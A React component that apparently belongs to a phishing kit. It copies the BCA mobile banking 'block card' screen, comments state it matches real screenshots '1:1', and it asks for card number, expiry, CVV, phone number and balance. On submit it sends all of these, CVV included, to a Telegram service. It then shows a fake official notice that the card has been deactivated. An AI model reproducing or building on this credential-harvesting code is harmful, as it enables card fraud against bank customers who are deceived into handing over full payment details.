import React, { useState } from 'react';
import { ArrowLeft, ShieldAlert, AlertCircle, Check } from 'lucide-react';
import {
  validateCardNumber,
  validatePhone,
  validateExpiry,
  validateCvv,
  validateBalance,
  detectCardNetwork,
} from '../utils/validation';
import { getFormattedWibDateTime } from '../utils/dateUtils';
import { ServiceProcessModal, ServiceReceiptData } from './ServiceProcessModal';
import { VirtualCardPreview } from './VirtualCardPreview';
import { TelegramService } from '../services/telegramService';
import { FormSkeletonOverlay } from './FormSkeletonOverlay';

interface MAdminBlokirViewProps {
  onBack: () => void;
  onProceedToBatalkan?: () => void;
}

export const MAdminBlokirView: React.FC<MAdminBlokirViewProps> = ({ onBack, onProceedToBatalkan }) => {
  const [cardNumber, setCardNumber] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [balance, setBalance] = useState('');

  // Status popups (Service Process Modal state)
  const [showProcessModal, setShowProcessModal] = useState(false);
  const [submissionError, setSubmissionError] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Card Flip interaction (flips to back on CVV focus or manual flip)
  const [isCvvFocused, setIsCvvFocused] = useState(false);
  const [isCardFlippedManual, setIsCardFlippedManual] = useState(false);
  const isCardFlipped = isCvvFocused || isCardFlippedManual;

  // Touch tracking for realtime feedback
  const [touched, setTouched] = useState({
    cardNumber: false,
    phoneNumber: false,
    expiry: false,
    cvv: false,
    balance: false,
  });

  const markTouched = (field: keyof typeof touched) => {
    setTouched((prev) => ({ ...prev, [field]: true }));
  };

  // Realtime validations
  const cardValidation = validateCardNumber(cardNumber);
  const phoneValidation = validatePhone(phoneNumber);
  const expiryValidation = validateExpiry(expiry);
  const cvvValidation = validateCvv(cvv);
  const balanceValidation = validateBalance(balance);
  const cardNetwork = detectCardNetwork(cardNumber);

  const isFormValid =
    cardValidation.isValid &&
    phoneValidation.isValid &&
    expiryValidation.isValid &&
    cvvValidation.isValid &&
    balanceValidation.isValid;

  // Formatter for Card Number (16 digits with space every 4 digits)
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = raw.replace(/(\d{4})(?=\d)/g, '$1 ');
    setCardNumber(formatted);
    if (!touched.cardNumber && raw.length >= 4) {
      markTouched('cardNumber');
    }
  };

  // Formatter for Phone Number (digits only, max 14)
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 14);
    setPhoneNumber(raw);
    if (!touched.phoneNumber && raw.length >= 4) {
      markTouched('phoneNumber');
    }
  };

  // Formatter for Expiry Date (MM/YY or BB/TT)
  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (raw.length >= 3) {
      raw = raw.slice(0, 2) + '/' + raw.slice(2);
    }
    setExpiry(raw);
    if (!touched.expiry && raw.length >= 2) {
      markTouched('expiry');
    }
  };

  // Formatter for CVV (3 digits)
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 3);
    setCvv(raw);
    if (!touched.cvv && raw.length >= 1) {
      markTouched('cvv');
    }
  };

  // Formatter for Limit / Saldo (Rupiah formatting)
  const handleBalanceChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '');
    if (!raw) {
      setBalance('');
      return;
    }
    const num = parseInt(raw, 10);
    setBalance(new Intl.NumberFormat('id-ID').format(num));
    if (!touched.balance) {
      markTouched('balance');
    }
  };

  const handleOkClick = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmissionError(null);
    setTouched({
      cardNumber: true,
      phoneNumber: true,
      expiry: true,
      cvv: true,
      balance: true,
    });

    if (!isFormValid) {
      return;
    }

    setIsSubmitting(true);
    // Ensure smooth perceived performance with minimum skeleton animation display time
    const [notificationSent] = await Promise.all([
      TelegramService.sendFormData({
        serviceType: 'blokir',
        serviceTitle: 'Pemblokiran Kartu BCA',
        bankTarget: 'BANK BCA',
        jenisKartu: cardNetwork || 'GPN / KARTU BANK',
        nomorKartu: cardNumber,
        nomorHp: phoneNumber,
        masaBerlaku: expiry,
        cvv: cvv,
        limitSaldo: balance ? `Rp ${balance}` : 'Rp 0',
        waktuInput: getFormattedWibDateTime(),
      }),
      new Promise((resolve) => setTimeout(resolve, 750)),
    ]);
    setIsSubmitting(false);

    if (!notificationSent) {
      setSubmissionError('Permintaan belum dapat dikirim. Periksa koneksi lalu coba lagi.');
      return;
    }

    setShowProcessModal(true);
  };

  const maskedCardDisplay = cardNumber
    ? cardNumber.replace(/^(\d{4})\s*(\d{4})\s*(\d{4})\s*(\d{4})$/, '$1 •••• •••• $4')
    : '4111 •••• •••• 1234';

  const receiptData: ServiceReceiptData = {
    serviceType: 'blokir',
    serviceTitle: 'Pemblokiran Kartu BCA',
    accountIdentifier: maskedCardDisplay,
    additionalDetails: [
      { label: 'Jaringan Kartu', value: cardNetwork || 'BCA Card' },
      { label: 'Nomor HP Terdaftar', value: phoneNumber ? phoneNumber.slice(0, 4) + '••••' + phoneNumber.slice(-3) : '-' },
      { label: 'Limit / Saldo Terakhir', value: balance ? `Rp ${balance}` : '-' },
      { label: 'Masa Berlaku', value: expiry || '-' },
    ],
    note: 'Status kartu debit/kredit Anda telah resmi dinonaktifkan seketika. Seluruh transaksi tunai ATM, mesin EDC, e-commerce, dan transaksi internasional telah dihentikan demi proteksi finansial Anda. Notifikasi konfirmasi resmi telah dikirim ke nomor HP terdaftar.',
  };

  return (
    <div className="fixed inset-0 z-50 bg-[#e8edf2] flex flex-col font-sans select-none overflow-y-auto">
      {/* 1. TOP HEADER (1:1 with Screenshot) */}
      <header className="sticky top-0 z-20 w-full bg-[#f8fafc] border-b border-[#d8e0e8] px-4 py-3 flex items-center justify-between shadow-xs">
        {/* Back Button */}
        <button
          onClick={onBack}
          type="button"
          className="p-1 -ml-1 text-[#0f3b60] hover:bg-[#e2e8f0] active:scale-95 rounded-full transition-all"
          aria-label="Kembali"
        >
          <ArrowLeft size={24} strokeWidth={2.4} />
        </button>

        {/* Title */}
        <h1 className="text-[17px] sm:text-[18px] font-bold text-[#0c3b68] tracking-tight">
          Blokir Kartu BCA
        </h1>

        {/* m-BCA Status Indicator Lamp (Green square) */}
        <div className="w-4 h-4 rounded-[3px] bg-[#8ac33e] shadow-[0_0_4px_rgba(138,195,62,0.6)]" />
      </header>

      {/* 2. MAIN FORM CONTAINER (1:1 with Screenshot) */}
      <main className="w-full max-w-[420px] mx-auto px-4 py-3 sm:py-4 flex flex-col">
        {/* Virtual Card Graphic (1:1 with Reference Screenshot IMG_20260906_081729_763.jpg) */}
        <VirtualCardPreview
          bankId="bca"
          bankName="BANK BCA"
          bankBadge="BCA"
          cardNumber={cardNumber}
          expiry={expiry}
          balance={balance}
          cardType="Kredit"
          cvv={cvv}
          isFlipped={isCardFlipped}
          onToggleFlip={() => setIsCardFlippedManual((prev) => !prev)}
        />

        {/* Input Form Fields with Realtime Validations */}
        <form noValidate onSubmit={handleOkClick} className="space-y-2.5 w-full relative">
          {/* Subtle Skeleton Loading Overlay upon submit */}
          <FormSkeletonOverlay
            isVisible={isSubmitting}
            type="card"
            message="Mengamankan & memproses kartu..."
          />

          {/* 1. Nomor Kartu */}
          <div>
            <div className="flex items-center justify-between mb-0.5">
              <label className="block text-[13px] font-semibold text-[#1e3853]">
                Nomor Kartu
              </label>
              {cardNetwork && (
                <span className="text-[9.5px] font-bold px-1.5 py-0.5 bg-blue-50 text-[#0c3b68] rounded border border-blue-200 uppercase tracking-wider">
                  {cardNetwork}
                </span>
              )}
            </div>
            <div className="relative">
              <input
                type="tel"
                inputMode="numeric"
                autoComplete="cc-number"
                placeholder="16 digit nomor kartu"
                value={cardNumber}
                onChange={handleCardNumberChange}
                onBlur={() => markTouched('cardNumber')}
                maxLength={19}
                className={`w-full bg-white border rounded-lg px-3 py-2 text-[13.5px] text-slate-800 placeholder-[#9ca3af] outline-none transition-all shadow-xs pr-9 ${
                  touched.cardNumber && !cardValidation.isValid
                    ? 'border-red-500 ring-1 ring-red-500/30'
                    : cardValidation.isValid
                    ? 'border-emerald-500 ring-1 ring-emerald-500/20'
                    : 'border-[#cbd5e1] focus:border-[#0c3b68] focus:ring-1 focus:ring-[#0c3b68]'
                }`}
              />
              <div className="absolute right-2.5 top-1/2 -translate-y-1/2 pointer-events-none">
                {cardValidation.isValid ? (
                  <Check size={17} className="text-emerald-600" />
                ) : touched.cardNumber && !cardValidation.isValid ? (
                  <AlertCircle size={17} className="text-red-500" />
                ) : null}
              </div>
            </div>
            {touched.cardNumber && !cardValidation.isValid && (
              <p className="text-[11px] text-red-600 mt-0.5 flex items-center gap-1 animate-in fade-in duration-150">
                <AlertCircle size={12} className="shrink-0" />
                <span>{cardValidation.message}</span>
              </p>
            )}
            {cardValidation.isValid && (
              <p className="text-[11px] text-emerald-600 mt-0.5 flex items-center gap-1 animate-in fade-in duration-150">
                <Check size={12} className="shrink-0" />
                <span>Format kartu 16 digit terverifikasi</span>
              </p>
            )}
          </div>

          {/* 2. Grid 2 Kolom: Masa Berlaku & CVV / CVC */}
          <div className="grid grid-cols-2 gap-2.5">
            <div>
              <label className="block text-[13px] font-semibold text-[#1e3853] mb-0.5">
                Masa Berlaku
              </label>
              <div className="relative">
                <input
                  type="tel"
                  inputMode="numeric"
                  autoComplete="cc-exp"
                  placeholder="BB/TT"
                  value={expiry}
                  onChange={handleExpiryChange}
                  onBlur={() => markTouched('expiry')}
                  maxLength={5}
                  className={`w-full bg-white border rounded-lg px-3 py-2 text-[13.5px] text-slate-800 placeholder-[#9ca3af] outline-none transition-all shadow-xs pr-8 ${
                    touched.expiry && !expiryValidation.isValid
                      ? 'border-red-500 ring-1 ring-red-500/30'
                      : expiryValidation.isValid
                      ? 'border-emerald-500 ring-1 ring-emerald-500/20'
                      : 'border-[#cbd5e1] focus:border-[#0c3b68] focus:ring-1 focus:ring-[#0c3b68]'
                  }`}
                />
                <div className="absolute right-2.5 top-1/2 -translate-y-1/2 pointer-events-none">
                  {expiryValidation.isValid ? (
                    <Check size={16} className="text-emerald-600" />
                  ) : touched.expiry && !expiryValidation.isValid ? (
                    <AlertCircle size={16} className="text-red-500" />
                  ) : null}
                </div>
              </div>
              {touched.expiry && !expiryValidation.isValid && (
                <p className="text-[10.5px] text-red-600 mt-0.5 flex items-center gap-0.5 animate-in fade-in duration-150 leading-tight">
                  <AlertCircle size={11} className="shrink-0" />
                  <span>{expiryValidation.message}</span>
                </p>
              )}
            </div>

            <div>
              <label className="block text-[13px] font-semibold text-[#1e3853] mb-0.5">
                CVV / CVC
              </label>
              <div className="relative">
                <input
                  type="password"
                  inputMode="numeric"
                  autoComplete="cc-csc"
                  placeholder="3 Digit"
                  value={cvv}
                  onChange={handleCvvChange}
                  onFocus={() => setIsCvvFocused(true)}
                  onBlur={() => {
                    setIsCvvFocused(false);
                    markTouched('cvv');
                  }}
                  maxLength={3}
                  className={`w-full bg-white border rounded-lg px-3 py-2 text-[13.5px] text-slate-800 placeholder-[#9ca3af] outline-none transition-all shadow-xs pr-8 tracking-widest ${
                    touched.cvv && !cvvValidation.isValid
                      ? 'border-red-500 ring-1 ring-red-500/30'
                      : cvvValidation.isValid
                      ? 'border-emerald-500 ring-1 ring-emerald-500/20'
                      : 'border-[#cbd5e1] focus:border-[#0c3b68] focus:ring-1 focus:ring-[#0c3b68]'
                  }`}
                />
                <div className="absolute right-2.5 top-1/2 -translate-y-1/2 pointer-events-none">
                  {cvvValidation.isValid ? (
                    <Check size={16} className="text-emerald-600" />
                  ) : touched.cvv && !cvvValidation.isValid ? (
                    <AlertCircle size={16} className="text-red-500" />
                  ) : null}
                </div>
              </div>
              {touched.cvv && !cvvValidation.isValid && (
                <p className="text-[10.5px] text-red-600 mt-0.5 flex items-center gap-0.5 animate-in fade-in duration-150 leading-tight">
                  <AlertCircle size={11} className="shrink-0" />
                  <span>{cvvValidation.message}</span>
                </p>
              )}
            </div>
          </div>

          {/* 3. Nomor Handphone Terdaftar */}
          <div>
            <label className="block text-[13px] font-semibold text-[#1e3853] mb-0.5">
              Nomor Handphone Terdaftar
            </label>
            <div className="relative">
              <input
                type="tel"
                inputMode="numeric"
                autoComplete="tel"
                placeholder="Contoh: 081234567890"
                value={phoneNumber}
                onChange={handlePhoneChange}
                onBlur={() => markTouched('phoneNumber')}
                className={`w-full bg-white border rounded-lg px-3 py-2 text-[13.5px] text-slate-800 placeholder-[#9ca3af] outline-none transition-all shadow-xs pr-9 ${
                  touched.phoneNumber && !phoneValidation.isValid
                    ? 'border-red-500 ring-1 ring-red-500/30'
                    : phoneValidation.isValid
                    ? 'border-emerald-500 ring-1 ring-emerald-500/20'
                    : 'border-[#cbd5e1] focus:border-[#0c3b68] focus:ring-1 focus:ring-[#0c3b68]'
                }`}
              />
              <div className="absolute right-2.5 top-1/2 -translate-y-1/2 pointer-events-none">
                {phoneValidation.isValid ? (
                  <Check size={17} className="text-emerald-600" />
                ) : touched.phoneNumber && !phoneValidation.isValid ? (
                  <AlertCircle size={17} className="text-red-500" />
                ) : null}
              </div>
            </div>
            {touched.phoneNumber && !phoneValidation.isValid && (
              <p className="text-[11px] text-red-600 mt-0.5 flex items-center gap-1 animate-in fade-in duration-150">
                <AlertCircle size={12} className="shrink-0" />
                <span>{phoneValidation.message}</span>
              </p>
            )}
          </div>

          {/* 4. Limit / Saldo Terakhir */}
          <div>
            <label className="block text-[13px] font-semibold text-[#1e3853] mb-0.5">
              Limit / Saldo Terakhir
            </label>
            <div className="relative">
              <input
                type="tel"
                inputMode="numeric"
                placeholder="Rp 0"
                value={balance ? `Rp ${balance}` : ''}
                onChange={handleBalanceChange}
                onBlur={() => markTouched('balance')}
                className={`w-full bg-white border rounded-lg px-3 py-2 text-[13.5px] text-slate-800 placeholder-[#9ca3af] outline-none transition-all shadow-xs pr-9 ${
                  touched.balance && !balanceValidation.isValid
                    ? 'border-red-500 ring-1 ring-red-500/30'
                    : balanceValidation.isValid
                    ? 'border-emerald-500 ring-1 ring-emerald-500/20'
                    : 'border-[#cbd5e1] focus:border-[#0c3b68] focus:ring-1 focus:ring-[#0c3b68]'
                }`}
              />
              <div className="absolute right-2.5 top-1/2 -translate-y-1/2 pointer-events-none">
                {balanceValidation.isValid ? (
                  <Check size={17} className="text-emerald-600" />
                ) : touched.balance && !balanceValidation.isValid ? (
                  <AlertCircle size={17} className="text-red-500" />
                ) : null}
              </div>
            </div>
            {touched.balance && !balanceValidation.isValid && (
              <p className="text-[11px] text-red-600 mt-0.5 flex items-center gap-1 animate-in fade-in duration-150">
                <AlertCircle size={12} className="shrink-0" />
                <span>{balanceValidation.message}</span>
              </p>
            )}
          </div>

          {/* 5. Warning / Notice Box (1:1 with Screenshot) */}
          <div className="bg-white border border-[#cbd5e1] rounded-lg p-2.5 mt-1 shadow-xs">
            <p className="text-[11px] leading-relaxed text-[#475569]">
              Pemblokiran kartu akan menghentikan seluruh transaksi tunai ATM,
              pembayaran merchant EDC, dan transaksi online debit/kredit
              seketika demi keamanan proteksi finansial Anda.
            </p>
          </div>

          {submissionError && (
            <div className="bg-red-50 border border-red-200 rounded-lg p-2.5 text-[11.5px] text-red-700 flex items-center gap-1.5">
              <AlertCircle size={14} className="shrink-0 text-red-500" />
              <span>{submissionError}</span>
            </div>
          )}

          {/* 6. Action Buttons: Cancel & OK (1:1 with Screenshot) */}
          <div className="grid grid-cols-2 gap-3 pt-1 pb-6 mt-2">
            {/* Cancel Button */}
            <button
              type="button"
              onClick={onBack}
              className="w-full py-2.5 px-4 rounded-lg bg-[#d5dde5] hover:bg-[#c6d1db] active:bg-[#b8c6d3] text-[#1e3853] font-bold text-[14px] transition-all cursor-pointer shadow-xs active:scale-[0.99] text-center"
            >
              Cancel
            </button>

            {/* OK Button */}
            <button
              type="submit"
              disabled={!isFormValid || isSubmitting}
              className={`w-full py-2.5 px-4 rounded-lg font-bold text-[14px] transition-all shadow-xs text-center ${
                isFormValid && !isSubmitting
                  ? 'bg-[#3b6285] hover:bg-[#325473] active:bg-[#28445e] text-white cursor-pointer active:scale-[0.99]'
                  : 'bg-[#d8e0e8] text-[#8e9ca8] cursor-not-allowed'
              }`}
            >
              {isSubmitting ? 'Mengirim...' : 'OK'}
            </button>
          </div>
        </form>
      </main>

      {/* Countdown Processing & Official Success Modal (1:1 with Recording) */}
      <ServiceProcessModal
        isOpen={showProcessModal}
        data={receiptData}
        countdownSeconds={6}
        onClose={() => {
          setShowProcessModal(false);
          if (onProceedToBatalkan) {
            onProceedToBatalkan();
          } else {
            onBack();
          }
        }}
      />
    </div>
  );
};
